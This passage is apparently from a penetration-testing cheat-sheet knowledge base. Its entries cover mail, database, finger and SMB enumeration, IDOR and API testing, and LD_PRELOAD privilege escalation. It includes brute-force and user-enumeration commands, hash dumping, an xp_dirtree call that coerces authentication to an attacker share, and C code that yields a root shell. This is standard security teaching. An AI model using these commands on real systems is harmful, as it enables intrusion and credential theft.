    nc -nv TARGET 25           # grab banner (software/version)
    nmap -p25 --script smtp-commands,smtp-open-relay,smtp-ntlm-info TARGET
    # EHLO target.com  -> lists supported verbs (VRFY, EXPN, AUTH, ...)

## Enumerate valid users
    smtp-user-enum -M VRFY -U users.txt -t TARGET     # VRFY <user>
    smtp-user-enum -M RCPT -U users.txt -t TARGET     # RCPT TO (works when VRFY is off)
    # manual: VRFY root  /  RCPT TO:<root>  -> 250/252 = exists, 550 = no

## Open relay (can you send as anyone?)
    swaks --to victim@corp.com --from spoof@corp.com --server TARGET
    nmap -p25 --script smtp-open-relay TARGET

## Why it matters
Valid usernames feed password-spraying and Kerberos roasting; an open relay enables phishing; AUTH
may accept weak creds. `smtp-ntlm-info` can leak the internal hostname/domain.

## Gotchas
- Many MTAs disable VRFY/EXPN -> fall back to RCPT TO enumeration.
- 587 (submission) usually needs STARTTLS+AUTH; 465 is SMTPS. Use swaks -tls for those.
- Rate-limit/greylisting can skew results; confirm a 'valid' user twice.

entries.title: POP3 / IMAP enumeration (110/995, 143/993)
entries.brief: Log in with found creds and read mailboxes for passwords, tokens and internal info
entries.body:
## Spot & banner
    nmap -p110,143,993,995 -sV --script pop3-capabilities,imap-capabilities TARGET
    nc -nv TARGET 110        # POP3 banner
    openssl s_client -connect TARGET:995   # POP3S / 993 for IMAPS

## POP3 login + read (plaintext 110)
    USER bob
    PASS Password123
    LIST            # message count/sizes
    RETR 1          # read message 1 (creds often sit in mail!)

## IMAP login + read (143)
    a LOGIN bob Password123
    a LIST "" "*"     # list folders
    a SELECT INBOX ; a FETCH 1 BODY[]   # read a message

## Brute (watch lockout)
    hydra -L users.txt -P pass.txt pop3://TARGET
    hydra -L users.txt -P pass.txt imap://TARGET

## Gotchas
- Mail is a goldmine: welcome emails, reset links, VPN/service creds — always read the inbox.
- Use the SSL ports (995/993) via openssl s_client when plaintext is disabled.
- Creds here frequently reuse across SMTP/AD — pivot with them.

entries.title: MySQL / MariaDB enumeration (3306)
entries.brief: Fingerprint, authenticate, enumerate databases and check FILE privilege
entries.body:
## Fingerprint
    nmap -p3306 -sV --script mysql-info,mysql-empty-password,mysql-users TARGET
    # mysql-empty-password catches root with no password (common on labs)

## Connect
    mysql -h TARGET -u root -p                  # try blank/weak passwords first
    mysql -h TARGET -u root -p'' -e 'select version();'

## Enumerate
    show databases; use <db>; show tables; select * from users;
    select user,authentication_string from mysql.user;   # hashes -> hashcat
    select current_user(), @@version, @@datadir;
    select @@secure_file_priv;    # '' or a path = FILE read/write possible

## Escalate (if privileged)
    # FILE priv -> read files / write a webshell (see sqli-to-rce)
    select load_file('/etc/passwd');
    # mysqld running as root -> UDF to OS command (see mysql-udf-privesc)

## Gotchas
- Remote root login is often restricted to localhost; a webapp SQLi may still reach it.
- `secure_file_priv` set to a path limits where OUTFILE can write (or blank = anywhere).
- Hashes: old `*ABC...` are mysql_native_password (hashcat -m 300).

entries.title: MSSQL enumeration (1433)
entries.brief: Fingerprint, log in, enumerate, and steal a NetNTLM hash with xp_dirtree
entries.body:
## Fingerprint
    nmap -p1433 -sV --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password TARGET
    # ms-sql-ntlm-info leaks hostname/domain; empty-password finds sa with no pw

## Connect
    impacket-mssqlclient user:pass@TARGET -windows-auth      # or SQL auth
    nxc mssql TARGET -u sa -p 'Password' -q 'SELECT @@version'
    sqsh -S TARGET -U sa -P 'Password'                        # plain client

## Enumerate
    SELECT name FROM sys.databases;
    SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');   # am I sa?
    EXEC sp_linkedservers;   # linked servers -> lateral (see mssql-linked-servers)

## Steal a NetNTLM hash (no sysadmin needed)
    # start responder, then force the SQL service account to auth to you:
    EXEC master..xp_dirtree '\\ATTACKER\share';   # or xp_fileexist / xp_subdirs
    # capture + crack the service account's NetNTLMv2 (see llmnr-nbtns-poisoning)

## Escalate
    # sysadmin -> xp_cmdshell for OS commands (see mssql-abuse)

## Gotchas
- xp_dirtree auth-coercion works with ANY login (not just sa) — great low-priv win.
- `-windows-auth` for domain accounts; omit it for SQL logins.
- impacket-mssqlclient has helpers: enable_xp_cmdshell, xp_cmdshell, enum_links.

entries.title: finger enumeration (79)
entries.brief: The finger service leaks usernames and who is logged in — quick user enum
entries.body:
## Spot it
    nmap -p79 -sV --script finger TARGET

## Query users
    finger @TARGET                 # who is logged in
    finger root@TARGET             # does 'root' exist? details
    finger user@TARGET

## Enumerate a list (Solaris/old UNIX box)
    # finger-user-enum (pentestmonkey):
    finger-user-enum.pl -U users.txt -t TARGET
    # a blank/0@ query on some servers dumps ALL accounts

## Why it matters
finger is ancient and almost always on legacy UNIX/Solaris targets; it hands you valid usernames
(and sometimes home dirs / last-login) to feed brute-force and spraying.

## Gotchas
- CVE-2001-era 'finger 0@host' / 'finger .@host' tricks dump the full user list on some daemons.
- Rarely seen on modern Linux; treat its presence as a strong 'old box' signal.

entries.title: IDOR hunting — insecure direct object references
entries.brief: Swap IDs to access other users' data/actions; the methodical way to find and prove it
entries.body:
## The idea
An IDOR is authorization missing on an object reference: the app checks you're logged in, but not
that the object belongs to YOU. Change the id and you read/modify someone else's data.

## Where to look
- URL/query: `/invoice?id=1004`, `/user/1007/profile`
- Body/JSON: `{"account_id": 55}`, hidden form fields
- Headers/cookies: `X-User-Id`, a role field in a JWT
- Filenames/paths: `/download?file=report_1004.pdf`

## Method (two accounts make it easy)
1. Do an action as user A; note the object id and request.
2. Repeat as user B but with A's id -> if you get A's data, it's an IDOR.
3. Try sequential/adjacent ids; also DELETE/PUT, not just GET (functional IDOR).

## Beating obfuscated ids
- base64/hex/hash the id? decode, change, re-encode.
- UUIDs leak elsewhere (listings, emails) — harvest then reuse.
- Mass-test with Burp Intruder / ffuf over the id range; diff response sizes.

## Gotchas
- Test write / state-changing actions too — read-only IDOR is often the least of it.
- A 200 with someone else's data = confirmed; a 403 means authz is actually enforced.
- Pair with **api-testing-methodology** for API-heavy apps.

entries.title: API testing methodology (REST / GraphQL / gRPC)
entries.brief: Discover endpoints, map auth, then test each verb for authz, injection and logic bugs
entries.body:
## 1. Discover the surface
    # swagger/openapi: /swagger.json /openapi.json /api-docs /v2/api-docs
    # from JS: getJS + LinkFinder (see those atlas entries)
    # brute: ffuf -u https://t/api/FUZZ -w api-wordlist ; kiterunner for API routes

## 2. Understand auth
    # how is a request authorized? Bearer JWT, API key header, cookie, HMAC?
    # grab a valid token; decode a JWT (jwt_tool) and look for weak alg/claims

## 3. Hit every method, not just GET
    # a resource may be read-protected but PUT/DELETE-open (verb-based authz gap)
    http GET api/users/1 ; http PUT api/users/1 role=admin   # mass-assignment (httpie)

## 4. Core tests
    - IDOR on every object id (see idor-hunting)
    - Mass assignment: add fields the UI doesn't send (is_admin, balance)
    - Injection: SQLi/NoSQLi/command in params + JSON values
    - Rate limits on auth/OTP; missing authz on 'internal' routes
    - BOLA/BFLA: object- vs function-level authorization

## GraphQL / gRPC specifics
    # GraphQL: introspection query -> full schema (see graphql-enumeration); batching abuse
    # gRPC: server reflection -> list methods (atlas: grpcurl)

## Gotchas
- Versioned APIs: an old `/v1/` route may lack a fix present in `/v2/`.
- Always test with TWO roles to prove authorization gaps, not just 200s.
- Tools: httpie/curl, websocat, grpcurl, Burp — see those atlas entries.

entries.title: LD_PRELOAD / ld.so.preload privesc
entries.brief: Load a malicious shared object into a root process via sudo env or a writable preload file
entries.body:
## Path A — sudo keeps LD_PRELOAD
If `sudo -l` shows `env_keep+=LD_PRELOAD` (and you may run something with sudo), you can load your
own .so into that root process:
    cat > /tmp/x.c <<'EOF'
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }
    EOF
    gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
    sudo LD_PRELOAD=/tmp/x.so <any-allowed-command>     # -> root shell

## Path B — writable /etc/ld.so.preload
If `/etc/ld.so.preload` is writable, every dynamically-linked binary loads your .so — the next
root-run program executes your payload:
    echo /tmp/x.so > /etc/ld.so.preload
    # wait for / trigger a root process (cron, login, a SUID binary)

## Related — LD_LIBRARY_PATH / RUNPATH
A sudo rule keeping LD_LIBRARY_PATH, or a SUID binary with a writable RPATH dir, lets you plant a
malicious library the program loads by name.

## Gotchas
- `_init()` (or `__attribute__((constructor))`) runs on load — that's what gives you code exec.
- Path A needs the env_keep AND a sudo-allowed command; check `sudo -l` output carefully.
- unsetenv(LD_PRELOAD) inside the .so avoids an infinite reload loop.

entries.title: SMB enumeration (139 / 445)
entries.brief: Null sessions, shares, users, versions — the single highest-yield Windows enum
entries.body:
## Fingerprint + known CVEs
    nmap -p139,445 --script smb-os-discovery,smb-security-mode,smb2-security-mode TARGET
    nmap -p445 --script 'smb-vuln-*' TARGET     # ms17-010 (EternalBlue), ms08-067, smbghost
    nxc smb TARGET                               # banner: OS, domain, SMBv1, signing

## Shares (anonymous first, then with creds)
    nxc smb TARGET -u '' -p '' --shares          # null session
    nxc smb TARGET -u guest -p '' --shares
